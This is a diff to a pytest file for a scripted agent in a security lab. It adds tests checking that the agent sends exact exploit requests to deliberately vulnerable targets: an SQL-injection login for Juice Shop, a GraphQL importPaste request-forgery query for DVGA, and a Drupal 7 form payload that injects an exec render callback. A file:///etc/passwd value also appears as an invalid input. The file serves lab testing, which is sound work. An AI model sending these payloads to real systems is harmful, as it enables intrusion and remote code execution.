@@ -3,12 +3,14 @@
 from __future__ import annotations
 
 import json
-from collections.abc import Mapping
+import urllib.parse
+from collections.abc import Callable, Mapping
 from dataclasses import dataclass, field
 from pathlib import Path
 from typing import Any
 
 import pytest
+import yaml
 from pydantic import TypeAdapter, ValidationError
 
 from agents.scripted.agent import (
@@ -81,7 +83,7 @@ def _script(**over: Any) -> AgentScript:
             {"action": "follow_decoy"},
             {"action": "callback_http"},
             {"action": "callback_dns"},
-            {"action": "graphql", "path": "/graphql", "query": OBJECTIVE},
+            {"action": "post", "path": "/graphql", "body": {"query": OBJECTIVE}},
         ],
     }
     doc.update(over)
@@ -227,7 +229,22 @@ def test_a_dns_failure_is_recorded(tmp_path: Path) -> None:
         {"steps": [{"action": "shell", "path": "/"}]},
         {"steps": [{"action": "fetch"}]},
         {"steps": [{"action": "fetch", "path": "robots.txt"}]},
-        {"steps": [{"action": "graphql", "path": "/graphql"}]},
+        {"steps": [{"action": "graphql", "path": "/graphql", "query": OBJECTIVE}]},
+        {"steps": [{"action": "post", "path": "/graphql"}]},
+        {"steps": [{"action": "post", "body": {"query": OBJECTIVE}}]},
+        {"steps": [{"action": "post", "path": "/x", "body": {"a": 1}, "form": [["a", "1"]]}]},
+        {"steps": [{"action": "post", "path": "/x", "form": []}]},
+        {"steps": [{"action": "post", "path": "/x", "form": [["", "1"]]}]},
+        {"steps": [{"action": "post", "path": "/x", "form": [["a"]]}]},
+        {"steps": [{"action": "post", "path": "/x", "form": [["a", "1", "2"]]}]},
+        {"steps": [{"action": "post", "path": "/x", "form": [["a", 1]]}]},
+        {"steps": [{"action": "post", "path": "/x", "form": [["a", "1"]] * 65}]},
+        {"steps": [{"action": "post", "path": "/x", "body": {"a": "x" * 9000}}]},
+        {"steps": [{"action": "post", "path": "x", "body": {"a": 1}}]},
+        {"steps": [{"action": "post", "path": "/a b", "body": {"a": 1}}]},
+        {"steps": [{"action": "fetch", "path": "/", "body": {"a": 1}}]},
+        {"steps": [{"action": "llm", "form": [["a", "1"]]}]},
+        {"steps": [{"action": "post", "path": "/x", "body": {"a": 1}, "query": "q"}]},
         {"target_url": "file:///etc/passwd"},
         {"callback_domain": "Not A Domain"},
         {"extra": 1},
@@ -260,3 +277,118 @@ def test_main_refuses_a_missing_run_id(tmp_path: Path, monkeypatch: pytest.Monke
     script.write_text(_script(steps=[]).model_dump_json())
     monkeypatch.delenv("LAB_RUN_ID", raising=False)
     assert main(["--script", str(script)]) == 2
+
+
+# --------------------------------------------------------------------------- per target
+
+REPO_ROOT = Path(__file__).resolve().parents[2]
+
+
+def _objective(target: str) -> dict[str, Any]:
+    """The objective step the cell file gives the scripted agent on ``target``."""
+    cell = yaml.safe_load((REPO_ROOT / "deploy" / "compose" / f"cell.{target}.yml").read_text())
+    step = cell["x-lab"]["objective"]
+    assert isinstance(step, dict)
+    return step
+
+
+def _dvga(body: bytes, headers: dict[str, str]) -> None:
+    assert headers["content-type"] == "application/json"
+    query = json.loads(body)["query"]
+    assert "importPaste" in query and 'host: "localhost"' in query and "port: 8000" in query
+
+
+def _juice(body: bytes, headers: dict[str, str]) -> None:
+    assert headers["content-type"] == "application/json"
+    login = json.loads(body)
+    assert login["email"] == "' OR 1=1--" and set(login) == {"email", "password"}
+
+
+def _drupal(body: bytes, headers: dict[str, str]) -> None:
+    assert headers["content-type"] == "application/x-www-form-urlencoded"
+    fields = urllib.parse.parse_qsl(body.decode(), strict_parsing=True)
+    assert fields == [
+        ("form_id", "user_register_form"),
+        ("_drupal_ajax", "1"),
+        ("mail[#post_render][]", "exec"),
+        ("mail[#type]", "markup"),
+        ("mail[#markup]", "/tmp/pwn"),  # noqa: S108 - the path inside the target
+    ]
+    # brackets and the hash are encoded, never sent raw
+    assert b"%5B%23post_render%5D%5B%5D=exec" in body
+
+
+#: target -> (what the target answers the exploit with, the request the exploit must be)
+EXPLOITS: dict[str, tuple[HttpResult, Callable[[bytes, dict[str, str]], None]]] = {
+    "dvga": (HttpResult(200, b'{"data":{"importPaste":{"result":"OK"}}}'), _dvga),
+    "juice-shop": (HttpResult(200, b'{"authentication":{"token":"t"}}'), _juice),
+    "drupal-7600": (HttpResult(200, b'[{"command":"insert"}]'), _drupal),
+}
+EXPLOIT_PATHS = {
+    "dvga": "/graphql",
+    "juice-shop": "/rest/user/login",
+    "drupal-7600": (
+        "/user/register?element_parents=account/mail/%23value&ajax_form=1"
+        "&_wrapper_format=drupal_ajax"
+    ),
+}
+
+
+@pytest.mark.parametrize("target", sorted(EXPLOITS))
+def test_scripted_exploit_per_target(tmp_path: Path, target: str) -> None:
+    answer, check = EXPLOITS[target]
+    step = _objective(target)
+    url = f"{TARGET}{EXPLOIT_PATHS[target]}"
+    http = FakeHttp({url: answer})
+    code = run_script(
+        _script(steps=[step]), http=http, resolve=lambda _: [], log=AgentLog(RUN_ID, tmp_path)
+    )
+    assert code == 0
+    ((method, sent_to, body, headers),) = http.requests
+    # exactly one request, to the run's own target (the injector in front of it)
+    assert (method, sent_to) == ("POST", url)
+    assert body is not None
+    check(body, headers)
+    events = _events(tmp_path)
+    call = next(e for e in events if e.event_type is AgentEventType.TOOL_CALL)
+    assert call.tool_name == "http_post" and call.url == url
+    # the target's answer is kept as a message, then the script ends
+    assert any(
+        e.event_type is AgentEventType.MESSAGE and e.text == answer.body.decode() for e in events
+    )
+    assert events[-1].event_type is AgentEventType.FINAL_REPORT
+
+
+@pytest.mark.parametrize("target", sorted(EXPLOITS))
+def test_an_exploit_the_target_refuses_is_recorded_and_the_script_ends(
+    tmp_path: Path, target: str
+) -> None:
+    http = FakeHttp({})  # every path answers 404
+    code = run_script(
+        _script(steps=[_objective(target), {"action": "llm"}]),
+        http=http,
+        resolve=lambda _: [],
+        log=AgentLog(RUN_ID, tmp_path),
+    )
+    assert code == 0
+    statuses = [
+        e.tool_args for e in _events(tmp_path) if e.event_type is AgentEventType.HTTP_REQUEST
+    ]
+    assert statuses[0] == {"status": 404, "bytes": len(b"not found")}
+
+
+@pytest.mark.parametrize("target", sorted(EXPLOITS))
+def test_an_unreachable_target_is_recorded_for_every_exploit(tmp_path: Path, target: str) -> None:
+    url = f"{TARGET}{EXPLOIT_PATHS[target]}"
+    http = FakeHttp({}, fail=frozenset({url}))
+    assert (
+        run_script(
+            _script(steps=[_objective(target)]),
+            http=http,
+            resolve=lambda _: [],
+            log=AgentLog(RUN_ID, tmp_path),
+        )
+        == 0
+    )
+    texts = [e.text or "" for e in _events(tmp_path)]
+    assert any(f"POST {url} failed: connection refused" in t for t in texts)
